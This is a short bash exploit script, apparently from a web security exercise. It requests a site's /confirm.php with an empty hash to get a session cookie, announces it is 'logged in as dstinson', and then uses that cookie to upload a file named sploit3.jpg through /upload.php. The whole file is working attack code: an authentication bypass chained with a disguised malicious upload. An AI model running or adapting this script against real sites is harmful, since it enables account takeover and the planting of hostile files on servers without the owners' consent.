#!/bin/bash          

url=$1
confirm='/confirm.php?hash='

curl -c cookies.txt $url$confirm

echo "Just logged in as dstinson"


upload='/upload.php'

curl -b cookies.txt -F fileToUpload=@sploit3.jpg $url$upload

echo "Just uploaded as dstinson"
